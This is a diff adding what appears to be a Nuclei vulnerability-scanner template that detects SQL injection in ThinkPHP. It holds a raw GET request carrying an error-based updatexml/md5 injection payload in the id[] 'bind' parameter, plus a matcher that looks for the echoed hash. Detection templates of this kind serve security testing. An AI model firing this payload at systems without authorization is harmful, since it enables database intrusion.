@@ -1,0 +1,29 @@
+id: poc-local-thinkphp-update-index-money-sqli
+
+info:
+  name: poc-local-thinkphp-update-index-money-sqli
+  author: capiton
+  severity: high
+  description: ""
+  reference: 
+    - https://github.com/bewhale/thinkphp_gui_tools
+  tags: thinkphp
+
+variables:
+  randInt: "{{rand_int(10000,99999)}}"
+  md5_randInt: "{{md5(randInt)}}"
+
+requests:
+  - raw:
+      - |-
+        GET /index.php?money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20md5({{randInt}})),0x7e),1)) HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        condition: and   
+        words:  
+          - "{{md5_randInt}}"
